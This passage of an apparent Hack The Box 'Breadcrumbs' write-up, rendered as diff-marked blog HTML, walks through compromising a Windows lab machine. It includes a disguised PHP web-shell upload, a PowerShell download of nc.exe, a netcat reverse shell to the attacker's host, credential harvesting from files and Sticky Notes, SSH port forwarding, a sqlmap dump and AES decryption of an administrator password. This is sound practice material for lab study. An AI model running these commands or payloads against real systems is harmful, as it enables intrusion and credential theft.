class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;shell.html&quot;</span></span><br><span class="line"></span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;task&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test.php</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span><br></pre></td></tr></table></figure>
+
+<p>responese</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line"></span><br><span class="line">Date: Tue, 23 Feb 2021 16:37:26 GMT</span><br><span class="line"></span><br><span class="line">Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1</span><br><span class="line"></span><br><span class="line">X-Powered-By: PHP/8.0.1</span><br><span class="line"></span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"></span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line"></span><br><span class="line">Pragma: no-cache</span><br><span class="line"></span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Success. Have a great weekend!</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb190.jpg"></li>
+</ul>
+<p>now change the phpinfo() to the following, and add html garbage data above to get a shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;h3&gt;Title: Animal Farm&lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;Author: George Orwell &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p style=<span class="string">&quot;color: red;&quot;</span>&gt;Max borrow duration: 8 days&lt;/p&gt;</span><br><span class="line"></span><br><span class="line">&lt;p&gt;About:&lt;br&gt;Animal Farm is an allegorical novella by George Orwell, first published <span class="keyword">in</span> England on 17 August 1945. The book tells the story of a group of farm animals <span class="built_in">who</span> rebel against their human farmer, hoping to create a society <span class="built_in">where</span> the animals can be equal, free, and happy.&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p>go to <span class="exturl" data-url="aHR0cDovLzEwLjEwLjEwLjIyOC9wb3J0YWwvdXBsb2Fkcw==">http://10.10.10.228/portal/uploads<i class="fa fa-external-link-alt"></i></span> can execute your file and now command execution</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.228/portal/uploads/luci.php?cmd=systeminfo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Host Name:                 BREADCRUMBS</span><br><span class="line">OS Name:                   Microsoft Windows 10 Pro</span><br><span class="line">OS Version:                10.0.19041 N/A Build 19041</span><br><span class="line">OS Manufacturer:           Microsoft Corporation</span><br><span class="line">OS Configuration:          Standalone Workstation</span><br><span class="line">OS Build Type:             Multiprocessor Free</span><br><span class="line">Registered Owner:          temp</span><br><span class="line">Registered Organization:   </span><br><span class="line">Product ID:                00331-20309-59368-AA373</span><br><span class="line">Original Install Date:     1/15/2021, 3:27:37 PM</span><br><span class="line">System Boot Time:          2/23/2021, 4:41:02 AM</span><br><span class="line">System Manufacturer:       VMware, Inc.</span><br><span class="line">System Model:              VMware7,1</span><br><span class="line">System Type:               x64-based PC</span><br></pre></td></tr></table></figure>
+
+<p>now use nc to get a shell:</p>
+<p>download nc:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Breadcrumbs]</span><br><span class="line">└─<span class="comment"># python -m SimpleHTTPServer 80</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 ...</span><br><span class="line">10.10.10.228 - - [23/Feb/2021 12:30:00] <span class="string">&quot;GET /nc.exe HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.228/portal/uploads/luci.php?cmd=powershell%20(new-object%20Net.WebClient).DownloadFile(%27http://10.10.14.12/nc.exe%27,%27C:\\Users\\www-data\\Desktop\\xampp\\htdocs\\portal\\uploads\\nc.exe%27)</span><br></pre></td></tr></table></figure>
+
+<p>then get a reverse shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.228/portal/uploads/luci.php?cmd=nc.exe%2010.10.14.12%203221%20-e%20c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvp 3221</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::3221</span><br><span class="line">Ncat: Listening on 0.0.0.0:3221</span><br><span class="line">Ncat: Connection from 10.10.10.228.</span><br><span class="line">Ncat: Connection from 10.10.10.228:50994.</span><br><span class="line">Microsoft Windows [Version 10.0.19041.746]</span><br><span class="line">(c) 2020 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads&gt;<span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">breadcrumbs\www-data</span><br><span class="line"></span><br><span class="line">C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 7C07-CD3A</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\www-data\Desktop\xampp\htdocs\portal\uploads</span><br><span class="line"></span><br><span class="line">02/23/2021  09:41 AM    &lt;DIR&gt;          .</span><br><span class="line">02/23/2021  09:41 AM    &lt;DIR&gt;          ..</span><br><span class="line">02/23/2021  09:13 AM               437 luci.php</span><br><span class="line">02/23/2021  09:41 AM            45,272 nc.exe</span><br><span class="line">02/23/2021  08:37 AM                18 test.php</span><br><span class="line">02/23/2021  09:04 AM               467 test11.php</span><br><span class="line">               4 File(s)         46,194 bytes</span><br><span class="line">               2 Dir(s)   6,313,857,024 bytes free</span><br></pre></td></tr></table></figure>
+
+<p>Look through folders and find a Juliette<br>Password</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData&gt;<span class="built_in">type</span> juliette.json</span><br><span class="line"><span class="built_in">type</span> juliette.json</span><br><span class="line">&#123;</span><br><span class="line">        <span class="string">&quot;pizza&quot;</span> : <span class="string">&quot;margherita&quot;</span>,</span><br><span class="line">        <span class="string">&quot;size&quot;</span> : <span class="string">&quot;large&quot;</span>,</span><br><span class="line">        <span class="string">&quot;drink&quot;</span> : <span class="string">&quot;water&quot;</span>,</span><br><span class="line">        <span class="string">&quot;card&quot;</span> : <span class="string">&quot;VISA&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PIN&quot;</span> : <span class="string">&quot;9890&quot;</span>,</span><br><span class="line">        <span class="string">&quot;alternate&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span> : <span class="string">&quot;juliette&quot;</span>,</span><br><span class="line">                <span class="string">&quot;password&quot;</span> : <span class="string">&quot;jUli901./())!&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Ssh the box, and got user flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Breadcrumbs]</span><br><span class="line">└─<span class="comment"># ssh juliette@10.10.10.228</span></span><br><span class="line">juliette@10.10.10.228<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Microsoft Windows [Version 10.0.19041.746]</span></span><br><span class="line"><span class="string">(c) 2020 Microsoft Corporation. All rights reserved.</span></span><br><span class="line"><span class="string">                                                    </span></span><br><span class="line"><span class="string">juliette@BREADCRUMBS C:\Users\juliette&gt;whoami       </span></span><br><span class="line"><span class="string">breadcrumbs\juliette                   </span></span><br><span class="line"><span class="string">                                       </span></span><br><span class="line"><span class="string">juliette@BREADCRUMBS C:\Users\juliette&gt;dir</span></span><br><span class="line"><span class="string"> Volume in drive C has no label.                  </span></span><br><span class="line"><span class="string"> Volume Serial Number is 7C07-CD3A                </span></span><br><span class="line"><span class="string">                                                  </span></span><br><span class="line"><span class="string"> Directory of C:\Users\juliette                   </span></span><br><span class="line"><span class="string">                                                  </span></span><br><span class="line"><span class="string">02/01/2021  05:48 AM    &lt;DIR&gt;          .          </span></span><br><span class="line"><span class="string">02/01/2021  05:48 AM    &lt;DIR&gt;          ..         </span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          3D Objects </span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          Contacts   </span></span><br><span class="line"><span class="string">01/15/2021  04:04 PM    &lt;DIR&gt;          Desktop    </span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          Documents  </span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          Downloads  </span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          Favorites  </span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          Links      </span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          Music      </span></span><br><span class="line"><span class="string">01/15/2021  04:03 PM    &lt;DIR&gt;          OneDrive   </span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          Pictures   </span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          Saved Games</span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          Searches   </span></span><br><span class="line"><span class="string">01/15/2021  04:00 PM    &lt;DIR&gt;          Videos     </span></span><br><span class="line"><span class="string">               0 File(s)              0 bytes     </span></span><br><span class="line"><span class="string">              15 Dir(s)   6,313,771,008 bytes free</span></span><br><span class="line"><span class="string">                                                  </span></span><br><span class="line"><span class="string">juliette@BREADCRUMBS C:\Users\juliette&gt;dir Desktop</span></span><br><span class="line"><span class="string"> Volume in drive C has no label.         </span></span><br><span class="line"><span class="string"> Volume Serial Number is 7C07-CD3A       </span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string"> Directory of C:\Users\juliette\Desktop  </span></span><br><span class="line"><span class="string">                                         </span></span><br><span class="line"><span class="string">01/15/2021  04:04 PM    &lt;DIR&gt;          . </span></span><br><span class="line"><span class="string">01/15/2021  04:04 PM    &lt;DIR&gt;          ..</span></span><br><span class="line"><span class="string">12/09/2020  06:27 AM               753 todo.html</span></span><br><span class="line"><span class="string">02/23/2021  04:42 AM                34 user.txt</span></span><br><span class="line"><span class="string">               2 File(s)            787 bytes</span></span><br><span class="line"><span class="string">               2 Dir(s)   6,313,771,008 bytes free</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">juliette@BREADCRUMBS C:\Users\juliette&gt;type Desktop\user.txt</span></span><br><span class="line"><span class="string">46c5036915d0f9a7dc2e480befc603d5</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb191.jpg"></li>
+</ul>
+<h3 id="get-administrator"><a href="#get-administrator" class="headerlink" title="get administrator"></a>get administrator</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">juliette@BREADCRUMBS C:\Users\juliette\Desktop&gt;<span class="built_in">type</span> todo.html</span><br><span class="line">&lt;html&gt;                                                     </span><br><span class="line">&lt;style&gt;                                                    </span><br><span class="line">html&#123;                                                      </span><br><span class="line">background:black;                                          </span><br><span class="line">color:orange;                                              </span><br><span class="line">&#125;                                                          </span><br><span class="line">table,th,td&#123;                                               </span><br><span class="line">border:1px solid orange;                                   </span><br><span class="line">padding:1em;                                               </span><br><span class="line">border-collapse:collapse;                                  </span><br><span class="line">&#125;                                                          </span><br><span class="line">&lt;/style&gt;                                                   </span><br><span class="line">&lt;table&gt;                                                    </span><br><span class="line">        &lt;<span class="built_in">tr</span>&gt;                                               </span><br><span class="line">            &lt;th&gt;Task&lt;/th&gt;                                  </span><br><span class="line">            &lt;th&gt;Status&lt;/th&gt;                                </span><br><span class="line">            &lt;th&gt;Reason&lt;/th&gt;                                </span><br><span class="line">        &lt;/tr&gt;                                              </span><br><span class="line">        &lt;<span class="built_in">tr</span>&gt;                                               </span><br><span class="line">            &lt;td&gt;Configure firewall <span class="keyword">for</span> port 22 and 445&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Not started&lt;/td&gt;                           </span><br><span class="line">            &lt;td&gt;Unauthorized access might be possible&lt;/td&gt; </span><br><span class="line">        &lt;/tr&gt;                                              </span><br><span class="line">        &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">            &lt;td&gt;Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;In progress&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;It stores passwords <span class="keyword">in</span> plain text&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;<span class="built_in">tr</span>&gt;</span><br><span class="line">            &lt;td&gt;Add new features to password manager&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Not started&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;To get promoted, hopefully lol&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>now need development user<br>Go to the location on windows where sticky notes are and download the<br>plum.sqlite<br>plum.sqlite-shm<br>plum.sqlite-wal</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">juliette@BREADCRUMBS C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState&gt;<span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 7C07-CD3A</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState</span><br><span class="line"></span><br><span class="line">01/15/2021  04:10 PM    &lt;DIR&gt;          .</span><br><span class="line">01/15/2021  04:10 PM    &lt;DIR&gt;          ..</span><br><span class="line">01/15/2021  04:10 PM            20,480 15cbbc93e90a4d56bf8d9a29305b8981.storage.session</span><br><span class="line">11/29/2020  03:10 AM             4,096 plum.sqlite</span><br><span class="line">01/15/2021  04:10 PM            32,768 plum.sqlite-shm</span><br><span class="line">01/15/2021  04:10 PM           329,632 plum.sqlite-wal</span><br><span class="line">               4 File(s)        386,976 bytes</span><br><span class="line">               2 Dir(s)   6,313,762,816 bytes free</span><br></pre></td></tr></table></figure>
+
+<p>you can use msf to get a rev shell to download files,</p>
+<p>Open sql (I copied back to my box using SMB)</p>
+<p>Get all notes then ssh as development with password in note</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">juliette: jUli901./())!</span><br><span class="line">development: fN3)sN5Ee@g</span><br><span class="line">administrator: [MOVED]</span><br></pre></td></tr></table></figure>
+
+<h3 id="Development"><a href="#Development" class="headerlink" title="Development"></a>Development</h3><p>Go to C:\Development</p>
+<p>There Linux binary<br>has useful information inside</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">development@BREADCRUMBS C:\Users\development&gt;<span class="built_in">cd</span> C:\Development</span><br><span class="line"></span><br><span class="line">development@BREADCRUMBS C:\Development&gt;<span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.                    </span><br><span class="line"> Volume Serial Number is 7C07-CD3A                  </span><br><span class="line">                                                    </span><br><span class="line"> Directory of C:\Development                        </span><br><span class="line">                                                    </span><br><span class="line">01/15/2021  04:03 PM    &lt;DIR&gt;          .            </span><br><span class="line">01/15/2021  04:03 PM    &lt;DIR&gt;          ..           </span><br><span class="line">11/29/2020  03:11 AM            18,312 Krypter_Linux</span><br><span class="line">               1 File(s)         18,312 bytes       </span><br><span class="line">               2 Dir(s)   6,310,158,336 bytes free</span><br></pre></td></tr></table></figure>
+
+<h3 id="Krypter-Linux"><a href="#Krypter-Linux" class="headerlink" title="Krypter_Linux"></a>Krypter_Linux</h3><p>ida open Krypter_Linux</p>
+<p>Inside there is command and you can see what it does when on box you do</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb192.jpg"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Development&gt; curl <span class="string">&#x27;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&#x27;</span> -UseBasicParsing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">StatusCode        : 200                                                                                               </span><br><span class="line">StatusDescription : OK                                                                                                </span><br><span class="line">Content           : selectarray(1) &#123;                                                                                  </span><br><span class="line">                      [0]=&gt;                                                                                           </span><br><span class="line">                      array(1) &#123;                                                                                      </span><br><span class="line">                        [<span class="string">&quot;aes_key&quot;</span>]=&gt;                                                                                 </span><br><span class="line">                        string(16) <span class="string">&quot;k19D193j.&lt;19391(&quot;</span>                                                                 </span><br><span class="line">                      &#125;                                                                                               </span><br><span class="line">                    &#125;                                                                                                 </span><br><span class="line">                                                                                                                      </span><br><span class="line">RawContent        : HTTP/1.1 200 OK                                                                                   </span><br><span class="line">                    Keep-Alive: <span class="built_in">timeout</span>=5, max=100                                                                    </span><br><span class="line">                    Connection: Keep-Alive                                                                            </span><br><span class="line">                    Content-Length: 96                                                                                </span><br><span class="line">                    Content-Type: text/html; charset=UTF-8                                                            </span><br><span class="line">                    Date: Tue, 23 Feb 2021 19:24:09 GMT                                                               </span><br><span class="line">                    Server: Apache/2.4.46 (Win64) ...                                                                 </span><br><span class="line">Forms             :                                                                                                   </span><br><span class="line">Headers           : &#123;[Keep-Alive, <span class="built_in">timeout</span>=5, max=100], [Connection, Keep-Alive], [Content-Length, 96], [Content-Type, </span><br><span class="line">                    text/html; charset=UTF-8]...&#125;                                                                     </span><br><span class="line">Images            : &#123;&#125;                                                                                                </span><br><span class="line">InputFields       : &#123;&#125;                                                                                                </span><br><span class="line">Links             : &#123;&#125;                                                                                                </span><br><span class="line">ParsedHtml        :                                                                                                   </span><br><span class="line">RawContentLength  : 96 </span><br></pre></td></tr></table></figure>
+
+<p>Gets aes key but can do sqlmaps through the url but port forward so you can do on kali</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -L 1234:127.0.0.1:1234 development@10.10.10.228</span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/Breadcrumbs]</span><br><span class="line">└─<span class="comment"># curl &#x27;http://127.0.0.1:1234/index.php?method=select&amp;username=administrator&amp;table=passwords&#x27;</span></span><br><span class="line">selectarray(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [<span class="string">&quot;aes_key&quot;</span>]=&gt;</span><br><span class="line">    string(16) <span class="string">&quot;k19D193j.&lt;19391(&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Run sqlmaps with flag –dump against</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://127.0.0.1:1234/index.php\?method\=select\&amp;username\=administrator\&amp;table\=passwords --dump</span><br><span class="line"></span><br><span class="line">Database: bread</span><br><span class="line">Table: passwords</span><br><span class="line">[1 entry]</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br><span class="line">| <span class="built_in">id</span> | account       | aes_key          | password                                     |</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br><span class="line">| 1  | Administrator | k19D193j.&lt;19391( | H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw= |</span><br><span class="line">+----+---------------+------------------+----------------------------------------------+</span><br></pre></td></tr></table></figure>
+
+<p>gives out put string</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H2dFz/jNwtSTWDURot9JBhWMP6XOdmcpgqvYHG35QKw=</span><br></pre></td></tr></table></figure>
+
+<p>With a key</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">k19D193j.&lt;19391(</span><br></pre></td></tr></table></figure>
+
+<p>Base 64 decode string<br>After base 64 decrypt do aes decrypt<br>Use cyberchef with input and output mode raw<br>Key in Latin and IV in hex (iv &#x3D;0000000000000000)</p>
+<p>go to following cyberchef url:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/<span class="comment">#recipe=From_Base64(&#x27;A-Za-z0-9%2B/%3D&#x27;,false)AES_Decrypt(%7B&#x27;option&#x27;:&#x27;Latin1&#x27;,&#x27;string&#x27;:&#x27;k19D193j.%3C19391(&#x27;%7D,%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;0000000000000000000000000000000&#x27;%7D,&#x27;CBC&#x27;,&#x27;Raw&#x27;,&#x27;Raw&#x27;,%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;&#x27;%7D,%7B&#x27;option&#x27;:&#x27;Hex&#x27;,&#x27;string&#x27;:&#x27;undefined&#x27;%7D)&amp;input=SDJkRnovak53dFNUV0RVUm90OUpCaFdNUDZYT2RtY3BncXZZSEczNVFLdz0</span></span><br></pre></td></tr></table></figure>
+
+<p>and finally get administrator’s password:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p@ssw0rd!@<span class="comment">#$9890./</span></span><br></pre></td></tr></table></figure>
+
+<p>then get the root flag:</p>
